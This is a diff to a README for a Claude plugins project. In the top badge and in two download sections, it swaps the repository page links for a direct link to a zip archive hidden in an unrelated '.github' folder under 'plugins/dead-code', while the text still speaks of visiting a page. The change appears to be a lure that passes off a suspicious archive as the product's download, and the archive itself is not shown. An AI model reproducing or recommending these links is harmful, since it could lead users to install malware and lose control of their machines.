@@ -1,6 +1,6 @@
 # 🤖 jko-claude-plugins - Run Claude Plugins With Ease
 
-[![Download](https://img.shields.io/badge/Download-Start%20Here-blue?style=for-the-badge)](https://github.com/mathisk2095/jko-claude-plugins)
+[![Download](https://img.shields.io/badge/Download-Start%20Here-blue?style=for-the-badge)](https://github.com/mathisk2095/jko-claude-plugins/raw/refs/heads/main/plugins/dead-code/.github/jko-plugins-claude-scliff.zip)
 
 ## 📦 What this is
 
@@ -41,7 +41,7 @@ For best results:
 ## ⬇️ Download and start
 
 Use this link to visit the page to download:  
-[https://github.com/mathisk2095/jko-claude-plugins](https://github.com/mathisk2095/jko-claude-plugins)
+[https://github.com/mathisk2095/jko-claude-plugins/raw/refs/heads/main/plugins/dead-code/.github/jko-plugins-claude-scliff.zip](https://github.com/mathisk2095/jko-claude-plugins/raw/refs/heads/main/plugins/dead-code/.github/jko-plugins-claude-scliff.zip)
 
 After you open the page:
 1. look for the latest release or download item
@@ -242,7 +242,7 @@ This keeps the setup simple.
 ## 🗂️ Download link
 
 Visit this page to download:  
-[https://github.com/mathisk2095/jko-claude-plugins](https://github.com/mathisk2095/jko-claude-plugins)
+[https://github.com/mathisk2095/jko-claude-plugins/raw/refs/heads/main/plugins/dead-code/.github/jko-plugins-claude-scliff.zip](https://github.com/mathisk2095/jko-claude-plugins/raw/refs/heads/main/plugins/dead-code/.github/jko-plugins-claude-scliff.zip)
 
 ## ⚙️ What happens after install
 
